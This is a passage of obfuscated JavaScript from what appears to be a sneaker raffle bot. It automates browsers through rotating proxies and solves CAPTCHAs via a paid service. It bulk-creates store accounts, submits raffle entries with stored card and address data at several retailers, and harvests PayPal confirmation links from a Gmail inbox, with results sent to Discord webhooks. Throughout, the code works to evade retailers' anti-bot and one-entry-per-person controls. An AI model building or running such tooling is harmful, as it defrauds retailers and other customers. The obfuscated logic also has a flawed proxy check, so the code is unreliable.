            var _0x3442cd = _0x43cf40()[_0x1c1faf]['split'](':');
        else
            var _0x170a85 = Math['round'](Math['random']() * (_0x43cf40()['length'] - 0x1)), _0x3442cd = _0x43cf40()[_0x170a85]['split'](':');
        const _0x1be49a = await _0x198f78['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3442cd[0x0] + ':' + _0x3442cd[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x5bdf81 = await _0x1be49a['newPage']();
            await _0x5bdf81['authenticate']({
                'username': '' + _0x3442cd[0x2],
                'password': '' + _0x3442cd[0x3]
            }), console['log'](_0x223c9e() + '\x20[' + _0x5b4cc8['name'] + ']\x20Task\x20' + (_0x1c1faf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5bdf81['setRequestInterception'](!![]), _0x5bdf81['on']('request', _0x5d73c3 => {
                _0x5d73c3['resourceType']() === 'image' || _0x5d73c3['resourceType']() === 'font' || _0x5d73c3['resourceType']() === 'media' ? _0x5d73c3['abort']() : _0x5d73c3['continue']();
            }), await _0x5bdf81['goto'](_0x397c78), await _0x1a79bd(0xbb8), await _0x5bdf81['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x223c9e() + '\x20[' + _0x5b4cc8['name'] + ']\x20Task\x20' + (_0x1c1faf + 0x1) + '\x20:\x20Filling\x20information'), await _0x5bdf81['type']('#RegisterForm-FirstName', '' + bouncewear[_0x1c1faf]['FirstName']), await _0x1a79bd(0x226), await _0x5bdf81['type']('#RegisterForm-LastName', '' + bouncewear[_0x1c1faf]['LastName']), await _0x1a79bd(0x226), await _0x5bdf81['type']('#RegisterForm-email', '' + bouncewear[_0x1c1faf]['Email']), await _0x1a79bd(0x226), await _0x5bdf81['type']('#RegisterForm-password', '' + bouncewear[_0x1c1faf]['Password']), await _0x1a79bd(0x226), await _0x5bdf81['click']('#marketing'), console['log'](_0x223c9e() + '\x20[' + _0x5b4cc8['name'] + ']\x20Task\x20' + (_0x1c1faf + 0x1) + '\x20:\x20Submitting..'), await _0x5bdf81['$eval']('#RegisterForm', _0x5d7c0a => _0x5d7c0a['submit']()), await _0x1a79bd(0x1f40), console['log'](_0x223c9e() + '\x20[' + _0x5b4cc8['name'] + ']\x20Task\x20' + (_0x1c1faf + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x5bdf81['solveRecaptchas'](), await _0x5bdf81['click']('.shopify-challenge__button.btn');
            async function _0x33181c() {
                for (var _0x1d7eb3 = 0x0; _0x1d7eb3 < 0x4; _0x1d7eb3++) {
                    try {
                        console['log']('try'), await _0x5bdf81['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x223c9e() + '\x20[' + _0x5b4cc8['name'] + ']\x20Task\x20' + (_0x1c1faf + 0x1) + '\x20:\x20' + _0x41d282['red']('Catpcha\x20failed,\x20retrying..')), await _0x5bdf81['solveRecaptchas'](), await _0x5bdf81['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x33181c(), console['log'](_0x223c9e() + '\x20[' + _0x5b4cc8['name'] + ']\x20Task\x20' + (_0x1c1faf + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1a79bd(0x1f4);
            try {
                await _0x5bdf81['waitForSelector']('.featured-title'), await _0x1a79bd(0x1f4), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x5b4cc8['name'] + ']\x20Task\x20' + (_0x1c1faf + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x1c1faf]['Email'] + '\x20Generated!')), _0x496729['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x1c1faf]['Email'] + ',' + bouncewear[_0x1c1faf]['Password']), console['log'](_0x41d282['yellow'](_0x223c9e() + '\x20[' + _0x5b4cc8['name'] + ']\x20Task\x20' + (_0x1c1faf + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x1c1faf]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x466960) {
                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x1c1faf + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x466960));
            }
        } catch (_0x2c383f) {
            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x1c1faf + 0x1) + '\x20:\x20' + _0x2c383f));
        } finally {
            _0x1be49a && _0x1be49a['close'](), console['log']('Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
        }
    }
}
async function _0x512e37(_0x54238b, _0x5b12ea, _0x1479a1) {
    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x37a01c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x593311 = 0x0; _0x593311 < _0x5b12ea['length']; _0x593311++) {
        _0x219354(_0x54238b['name'] + '\x20Task\x20' + (_0x593311 + 0x1) + '\x20/\x20' + _0x5b12ea['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79);
        var _0x4db3a9 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3da10f
                },
                {
                    'name': 'Product',
                    'value': '' + _0x5b12ea[_0x593311]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x5b12ea[_0x593311]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x37a01c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x37a01c['version']
                }
            ]
        }];
        const _0x3e6623 = { 'embeds': _0x4db3a9 };
        await _0x170817(_0x5b12ea, _0x593311);
        if (_0x5b12ea[_0x593311]['Email'] == '' || _0x5b12ea[_0x593311]['Password'] == '' || _0x5b12ea[_0x593311]['FirstName'] == '' || _0x5b12ea[_0x593311]['LastName'] == '') {
            console['log'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x5b12ea[_0x593311]['Password'] == '' || _0x5b12ea[_0x593311]['Password'] == undefined) && (_0x5b12ea[_0x593311]['Password'] = 'ErehsaWonRaj1!');
        if (_0x37a01c['useRandomProxy'] = ![])
            var _0x2b2d58 = _0x1479a1[_0x593311]['split'](':');
        else
            var _0x2a8dc2 = Math['round'](Math['random']() * (_0x1479a1['length'] - 0x1)), _0x2b2d58 = _0x1479a1[_0x2a8dc2]['split'](':');
        const _0x38be0d = await _0x198f78['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2b2d58[0x0] + ':' + _0x2b2d58[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xa794fd = await _0x38be0d['newPage']();
            await _0xa794fd['authenticate']({
                'username': '' + _0x2b2d58[0x2],
                'password': '' + _0x2b2d58[0x3]
            }), console['log'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xa794fd['setRequestInterception'](!![]), _0xa794fd['on']('request', _0xe31ce3 => {
                _0xe31ce3['resourceType']() === 'image' || _0xe31ce3['resourceType']() === 'font' || _0xe31ce3['resourceType']() === 'media' ? _0xe31ce3['abort']() : _0xe31ce3['continue']();
            }), await _0xa794fd['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0xa794fd['goto']('' + _0x5b12ea[_0x593311]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0xa794fd['waitForSelector']('#btnPdpAtb'), console['log'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x5b12ea[_0x593311]['Size']);
            const _0x934c46 = await _0xa794fd['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x46a751 => {
                return _0x46a751['map'](_0x1ee9e0 => _0x1ee9e0['innerText']);
            }), _0x56c4ca = await _0xa794fd['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x5444a1 = ![];
            if (_0x5b12ea[_0x593311]['Size'] == 'RANDOM') {
                var _0x26354e = Math['round'](Math['random']() * (_0x56c4ca['length'] - 0x1));
                await _0x56c4ca[_0x26354e]['click']();
            } else
                for (var _0x32fdb7 = 0x0; _0x32fdb7 < _0x934c46['length']; _0x32fdb7++) {
                    if (_0x934c46[_0x32fdb7] != _0x5b12ea[_0x593311]['Size'])
                        continue;
                    try {
                        await _0x56c4ca[_0x32fdb7]['click']();
                    } catch {
                        console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x5444a1 = !![];
                    }
                }
            if (_0x5444a1)
                continue;
            await _0x1a79bd(0x578), await _0xa794fd['click']('#btnPdpAtb'), await _0xa794fd['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x1a79bd(0x3e8), console['log'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0xa794fd['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0xa794fd['waitForSelector']('#email'), await _0xa794fd['type']('#email', _0x5b12ea[_0x593311]['Email']), await _0x1a79bd(0x226), await _0xa794fd['click']('#guest-submit'), await _0x1a79bd(0x1b58), console['log'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x20Filling\x20Information'), await _0xa794fd['waitForSelector']('#firstname'), await _0xa794fd['type']('#firstname', _0x5b12ea[_0x593311]['FirstName'], 0x1f4), await _0x1a79bd(0x190), await _0xa794fd['waitForSelector']('#surname'), await _0xa794fd['type']('#surname', _0x5b12ea[_0x593311]['LastName'], 0x1f4), await _0x1a79bd(0x190), await _0xa794fd['waitForSelector']('#mobile'), await _0xa794fd['type']('#mobile', _0x5b12ea[_0x593311]['Phone'], 0x1f4), await _0x1a79bd(0x190), await _0xa794fd['click']('#enterManualDiv'), await _0x1a79bd(0x5dc), await _0xa794fd['waitForSelector']('#address1'), await _0xa794fd['type']('#address1', _0x5b12ea[_0x593311]['Address1'] + '\x20' + _0x5b12ea[_0x593311]['HouseNumber'], 0x226), await _0x1a79bd(0x384), await _0xa794fd['waitForSelector']('#address2'), await _0xa794fd['type']('#address2', '' + _0x5b12ea[_0x593311]['Address2'], 0x226), await _0x1a79bd(0x320);
            const _0x568d2b = await _0xa794fd['$$eval']('#countryselect_view3\x20>\x20option', _0x38f8ad => {
                return _0x38f8ad['map'](_0x5ded66 => _0x5ded66['value']);
            });
            var _0xd4e706;
            for (var _0x325d09 = 0x0; _0x325d09 < _0x568d2b['length']; _0x325d09++) {
                if (_0x568d2b[_0x325d09]['startsWith']('' + _0x5b12ea[_0x593311]['Country'])) {
                    _0xd4e706 = _0x568d2b[_0x325d09];
                    break;
                }
                continue;
            }
            await _0xa794fd['select']('#countryselect_view3', '' + _0xd4e706), await _0xa794fd['waitForSelector']('#address4'), await _0xa794fd['type']('#address4', '' + _0x5b12ea[_0x593311]['City'], 0x1f4), await _0x1a79bd(0x384), await _0xa794fd['waitForSelector']('#postcode'), await _0xa794fd['type']('#postcode', '' + _0x5b12ea[_0x593311]['Zip'], 0x1f4), await _0x1a79bd(0x4b0);
            const _0x353c81 = await _0xa794fd['url']();
            console['log'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x1fbe0e = _0x353c81['split']('?')[0x1], _0x14ac73 = await _0xa794fd['$']('#co_address_submit');
            await _0x14ac73['evaluate'](_0x24b1ab => _0x24b1ab['click']()), await _0x1a79bd(0x1388), await _0xa794fd['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x1fbe0e), console['log'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0xa794fd['waitForSelector']('#paymentbuttons'), await _0x1a79bd(0x1388), await _0xa794fd['click']('#paymentbuttons\x20>\x20div'), await _0x1a79bd(0x1c2), await _0xa794fd['waitForSelector']('#card-number'), await _0xa794fd['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x468138 = await _0xa794fd['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x280090 = await _0x468138['contentFrame']();
            await _0x280090['waitForSelector']('.InputContainer'), await _0x280090['click']('.InputContainer\x20>\x20input'), await _0x1a79bd(0x578), await _0xa794fd['type']('#card-number', '' + _0x5b12ea[_0x593311]['CreditNumber']), await _0x1a79bd(0xfa), await _0xa794fd['type']('#card-expiry', '' + _0x5b12ea[_0x593311]['ExpiryDate']), await _0x1a79bd(0xfa), await _0xa794fd['type']('#card-cvc', '' + _0x5b12ea[_0x593311]['CVV']), await _0x1a79bd(0x7d0), await _0xa794fd['click']('#card-button'), console['log'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0xa794fd['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x21228b(_0x152092, _0x3e6623);
            } catch {
                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x203DS\x20Failed')), _0x4db3a9[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x4db3a9[0x0]['description'] = '3DS\x20Failed', await _0x21228b(_0x549818, _0x3e6623);
            }
        } catch (_0x13b226) {
            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x54238b['name'] + ']\x20Task\x20' + (_0x593311 + 0x1) + '\x20:\x20' + _0x13b226)), _0x4db3a9[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x4db3a9[0x0]['description'] = '' + _0x13b226, await _0x21228b(_0x549818, _0x3e6623);
        } finally {
            _0x38be0d && _0x38be0d['close']();
            if (_0x593311 + 0x1 == _0x5b12ea['length']) {
                console['log'](_0x41d282['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x1a79bd(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x37a01c['AfewDelay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['AfewDelay']);
        }
    }
}
async function _0x4f9070(_0x1ff013, _0x2d0c2f, _0x977053, _0x45e896, _0x172e05) {
    var _0x23fa0, _0x5ab8fd = {}, _0x5e3ff0 = [], _0x40bea2 = {}, _0x3e1919 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x45e896 && (_0x45e896 = {});
    if (_0x2d0c2f != 'ver') {
        _0x219354(_0x977053['name'] + '\x20Task\x20' + (_0x1ff013 + 0x1) + '\x20/\x20' + _0x45e896['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79), await _0x170817(_0x45e896, _0x1ff013), _0x5e3ff0 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3da10f
                },
                {
                    'name': 'Size',
                    'value': '' + _0x45e896[_0x1ff013]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x37a01c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x3dc3b3
                }
            ]
        }], _0x40bea2 = { 'embeds': _0x5e3ff0 }, _0x5ab8fd = _0x977053['data'];
        _0x2d0c2f == 'exp' ? _0x5ab8fd['data']['attributes']['email'] = '' + _0x45e896[_0x1ff013]['FirstName'] + _0x45e896[_0x1ff013]['LastName'] + _0x37a01c['catchall'] : _0x5ab8fd['data']['attributes']['email'] = '' + _0x45e896[_0x1ff013]['Email'];
        if (_0x45e896[_0x1ff013]['Size'] == 'RANDOM') {
        }
        _0x5ab8fd['data']['attributes']['properties']['$first_name'] = '' + _0x45e896[_0x1ff013]['FirstName'], _0x5ab8fd['data']['attributes']['properties']['$last_name'] = '' + _0x45e896[_0x1ff013]['LastName'], _0x5ab8fd['data']['attributes']['properties']['$address1'] = _0x45e896[_0x1ff013]['Address1'] + '\x20' + _0x45e896[_0x1ff013]['Address2'] + '\x20' + _0x45e896[_0x1ff013]['HouseNumber'], _0x5ab8fd['data']['attributes']['properties']['$zip'] = '' + _0x45e896[_0x1ff013]['Zip'], _0x5ab8fd['data']['attributes']['properties']['$city'] = '' + _0x45e896[_0x1ff013]['City'], _0x5ab8fd['data']['attributes']['properties']['$country'] = '' + _0x45e896[_0x1ff013]['Country'], _0x5ab8fd['data']['attributes']['properties']['Size'] = '' + _0x45e896[_0x1ff013]['Size'], _0x5ab8fd['data']['attributes']['properties']['$phone_number'] = '' + _0x45e896[_0x1ff013]['Phone'], _0x5ab8fd['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x45e896[_0x1ff013]['Follower'];
    }
    if (_0x37a01c['useRandomProxy'] = ![])
        var _0x19565a = _0x172e05[_0x1ff013]['split'](':');
    else
        var _0x25928c = Math['round'](Math['random']() * (_0x172e05['length'] - 0x1)), _0x19565a = _0x172e05[_0x25928c]['split'](':');
    var _0x4d3411 = {
        'jar': _0x2b4f8d,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x977053['url'],
        'headers': _0x977053['headers'],
        'body': JSON['stringify'](_0x5ab8fd),
        'proxy': 'http://' + _0x19565a[0x2] + ':' + _0x19565a[0x3] + '@' + _0x19565a[0x0] + ':' + _0x19565a[0x1]
    };
    return _0x2d0c2f != 'ver' && (_0x4d3411['url'] = _0x977053['url'], _0x4d3411['headers'] = _0x977053['headers']), _0x2d0c2f == 'ver' && (_0x4d3411['method'] = 'GET'), new Promise(function (_0x4853cc, _0x1dadc5) {
        callback = async (_0x28968a, _0x2b294d, _0x3946b5) => {
            if (!_0x28968a && _0x2b294d['statusCode'] == 0xca || !_0x28968a && _0x2b294d['statusCode'] == 0xc8) {
                if (_0x2d0c2f != 'ver') {
                    var _0x3efbfa = await _0x550a27(_0x45e896[_0x1ff013], _0x977053, 'dev', ![]), _0x1b0ddd = await _0x550a27(_0x45e896[_0x1ff013], _0x977053, 'pub', ![]);
                    const _0x526f14 = {
                        'succesDEVMSG': { 'embeds': [_0x3efbfa] },
                        'succesPUBMSG': { 'embeds': [_0x1b0ddd] }
                    };
                    if (_0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '')
                        try {
                            await _0x21228b(_0x37a01c['webhook'], _0x526f14['succesDEVMSG']);
                        } catch {
                        }
                    await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x526f14['succesDEVMSG']), await _0x1a79bd(0xc8);
                    try {
                        await _0x21228b(_0x136ee7, _0x526f14['succesPUBMSG']);
                    } catch {
                    }
                    _0x4c6d06(_0x45e896[_0x1ff013], _0x977053);
                }
                _0x4853cc(console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x977053['name'] + ']\x20Task\x20' + (_0x1ff013 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x2d0c2f != 'ver') {
                    var _0x39f6ff = '' + _0x28968a, _0x6ef624 = await _0x550a27(_0x45e896[_0x1ff013], _0x977053, 'dev', !![], _0x39f6ff), _0x2767c8 = {};
                    _0x2767c8['errorDEV'] = { 'embeds': [_0x6ef624] }, _0x2e4d36(_0x45e896[_0x1ff013], _0x977053), _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x2767c8['errorDEV']), await _0x21228b(_0x549818, _0x2767c8['errorDEV']);
                }
                _0x1dadc5(console['log'](_0x223c9e() + '\x20[' + _0x977053['name'] + ']\x20Task\x20' + (_0x1ff013 + 0x1) + ':\x20' + _0x28968a));
            }
        };
        try {
            _0x2d0c2f != 'ver' && console['log'](_0x223c9e() + '\x20[' + _0x977053['name'] + ']\x20Task\x20' + (_0x1ff013 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5ab8fd['data']['attributes']['email']), _0x45dd39(_0x4d3411, callback);
        } catch (_0x1b536a) {
            console['log'](_0x223c9e() + '\x20Task\x20' + (_0x1ff013 + 0x1) + ':\x20' + _0x1b536a);
        }
    });
}
;
async function _0x356d8a(_0x52b474, _0x5da862) {
    if (_0x384381 != 'yes')
        var _0x384381 = '', _0x1c5689 = 0x0;
    var _0x7bd3f1 = [];
    async function _0x3d9b06() {
        console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify?');
        var _0xcd9528 = await _0x5208ba['get']('Quantity')['Quantity'], _0x1bf78c = new _0x27a360({
            'user': _0x37a01c['masterMail'],
            'password': _0x37a01c['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x50f89c(_0x29aee8) {
            _0x1bf78c['openBox']('INBOX', ![], _0x29aee8);
        }
        _0x1bf78c['once']('ready', function () {
            _0x50f89c(function (_0x540e82, _0x389232) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x540e82)
                    throw _0x540e82;
                _0x1bf78c['seq']['search'](['UNSEEN'], function (_0x5475f0, _0x2d9cc9) {
                    if (!_0x2d9cc9 || !_0x2d9cc9['length'])
                        console['log'](_0x223c9e() + '\x20[' + _0x52b474['name'] + ']\x20No\x20mails\x20found'), _0x1bf78c['end']();
                    else {
                        var _0x5a12a1 = _0x1bf78c['seq']['fetch'](_0x2d9cc9, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x5a12a1['on']('message', function (_0x53565d, _0x56312e) {
                            var _0x1bb78e = '(#' + _0x56312e + ')\x20';
                            _0x53565d['on']('body', function (_0x5b46bc, _0xe15895) {
                                _0x5d77b8(_0x5b46bc, (_0x578cb8, _0x57030b) => {
                                    if (_0x57030b['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x57030b['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x57030b['text']['split']('[')[0x2];
                                        var _0x34bb38 = mes['split'](']')[0x0];
                                        _0x7bd3f1['push'](_0x34bb38);
                                    }
                                });
                            }), _0x53565d['once']('end', function () {
                            });
                        }), _0x5a12a1['once']('error', function (_0x1c6a7e) {
                            console['log']('Fetch\x20error:\x20' + _0x1c6a7e);
                        }), _0x5a12a1['once']('end', function () {
                            _0x1bf78c['end']();
                        });
                    }
                });
            });
        }), _0x1bf78c['once']('error', function (_0x47c75f) {
            console['log'](_0x41d282['red'](_0x47c75f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x1bf78c['once']('end', async function () {
        }), _0x1bf78c['connect']();
    }
    try {
        _0x3d9b06(), await _0x1a79bd(0xfa0), console['log']('Found\x20' + _0x7bd3f1['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
    }
    var _0x1d8c8e;
    _0x219354('' + _0x52b474);
    var _0x4d8a42 = _0x5da862[0x0]['split'](':');
    const _0x32005a = await _0x198f78['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x4d8a42[0x0] + ':' + _0x4d8a42[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x223c9e() + '\x20[' + _0x52b474 + ']\x20Getting\x20Session');
        const _0x4adc43 = await _0x32005a['newPage']();
        await _0x4adc43['authenticate']({
            'username': '' + _0x4d8a42[0x2],
            'password': '' + _0x4d8a42[0x3]
        }), await _0x4adc43['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x4adc43, await _0x4adc43['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x223c9e() + '\x20[' + _0x52b474 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x4adc43['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x223c9e() + '\x20[' + _0x52b474 + ']\x20Successfully\x20logged\x20in'), await _0x1a79bd(0x2710);
        } catch (_0xad09db) {
            throw new Error('Login\x20session\x20expired\x20' + _0xad09db);
        }
        for (var _0x3cb27d = 0x0; _0x3cb27d < _0x7bd3f1['length']; _0x3cb27d++) {
            console['log'](_0x223c9e() + '\x20[' + _0x52b474 + ']\x20Task\x20' + (_0x3cb27d + 0x1) + '\x20:\x20Starting\x20Verification'), _0x219354(_0x52b474 + '\x20Task\x20' + (_0x3cb27d + 0x1) + '\x20/\x20' + _0x7bd3f1['length']);
            const _0x3c182b = await _0x32005a['newPage']();
            await _0x3c182b['goto']('' + _0x7bd3f1[_0x3cb27d], { 'waitUntil': 'networkidle2' }), await _0x1a79bd(0xbb8);
            try {
                const _0x2c1c69 = await _0x3c182b['$']('#challenge-heading');
                _0x2c1c69 && (console['log'](_0x223c9e() + '\x20[' + _0x52b474 + ']\x20Task\x20' + (_0x3cb27d + 0x1) + '\x20:\x20' + _0x41d282['yellow']('2FA\x20Required')), await _0x3c182b['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x1a79bd(0x9c40), await _0x3c182b['waitForSelector']('#payment-submit-btn'), await _0x3c182b['$eval']('#payment-submit-btn', _0x3e9bb2 => _0x3e9bb2['click']()), await _0x3c182b['click']('#payment-submit-btn');
                try {
                    await _0x3c182b['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x1a79bd(0x5dc), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x52b474 + ']\x20Task\x20' + (_0x3cb27d + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0xdfca5b) {
                    _0x384381 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0xdfca5b['message']);
                } finally {
                    if (_0x384381 == 'yes' && _0x1c5689 != 0x2) {
                        console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x52b474['name'] + ']\x20Task\x20' + (_0x3cb27d + 0x1) + '\x20:\x20Retrying')), _0x3cb27d = _0x3cb27d - 0x1, _0x1c5689 = _0x1c5689 + 0x1;
                        continue;
                    }
                    _0x384381 == 'yes' && _0x1c5689 >= 0x2 && (_0x2e4d36(csv[_0x3cb27d], _0x52b474), _0x384381 = 'no', _0x1c5689 = 0x0), await _0x3c182b['close'](), await _0x1a79bd(0x4650);
                }
            } catch (_0x494d13) {
                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x52b474 + ']\x20Task\x20' + (_0x3cb27d + 0x1) + '\x20:\x20' + _0x494d13));
            }
        }
    } catch (_0x55e58f) {
        console['log'](_0x41d282['red']('' + _0x55e58f));
    } finally {
        return await _0x32005a['close'](), menu();
    }
}
const _0x1ee1d2 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x4661ec, _0x375ac9, _0x4e03db) {
                    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37a01c['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5aa9f7 = 0x0; _0x5aa9f7 < _0x375ac9['length']; _0x5aa9f7++) {
                        if (_0x1e91db != 'yes')
                            var _0x1e91db = '', _0x4f9a45 = 0x0;
                        var _0x2ae2cd;
                        await _0x170817(_0x375ac9, _0x5aa9f7), _0x219354(_0x4661ec['name'] + '\x20Task\x20' + (_0x5aa9f7 + 0x1) + '\x20/\x20' + _0x375ac9['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79);
                        var _0x5ed7af = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x4f6ea3 = Math['round'](Math['random']() * (_0x5ed7af['length'] - 0x1));
                        _0x375ac9[_0x5aa9f7]['Size'] == 'RANDOM' && (_0x375ac9[_0x5aa9f7]['Size'] = _0x5ed7af[_0x4f6ea3]);
                        var _0x5c659f = Math['round'](Math['random']() * (_0x4e03db['length'] - 0x1)), _0x11384e = _0x4e03db[_0x5c659f]['split'](':'), _0x4ddb08;
                        try {
                            _0x4ddb08 = await _0x198f78['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
